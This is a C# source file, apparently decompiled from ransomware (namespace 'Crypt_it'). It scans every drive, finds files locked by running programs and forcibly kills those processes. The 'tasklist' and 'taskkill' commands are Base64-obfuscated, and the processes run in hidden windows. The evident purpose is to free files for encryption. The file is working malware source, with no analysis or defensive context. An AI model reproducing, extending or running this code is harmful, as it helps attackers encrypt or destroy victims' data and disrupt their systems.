using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace Crypt_it;

internal class LockedFiles
{
	public static readonly List<string> GeneralFilesList = new List<string>();

	public static readonly List<string> OpenFilesList = new List<string>();

	public static void ReleaseLockedFiles()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					RecursiveReleaseFiles(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void RecursiveReleaseFiles(string path)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					GeneralFilesList.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					RecursiveReleaseFiles(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (GeneralFilesList.Count <= 0)
		{
			return;
		}
		foreach (string item in GeneralFilesList.Where((string text) => Islocked(text)))
		{
			OpenFilesList.Add(item);
		}
		GeneralFilesList.Clear();
		if (OpenFilesList.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in OpenFilesList.Select((string text2) => new FileInfo(text2)))
		{
			Killproc(item2.Name);
		}
	}

	public static bool Islocked(string fileName)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(fileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void Killproc(string filename)
	{
		try
		{
			string text = proc_exe(Program.Base64Decode("dGFza2xpc3Q="), Program.Base64Decode("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(filename)
				select t.Split(new char[1] { ',' }) into array2
				select array2[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				proc_exe(Program.Base64Decode("dGFza2tpbGw="), Program.Base64Decode("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string proc_exe(string file, string arg)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(file, arg);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
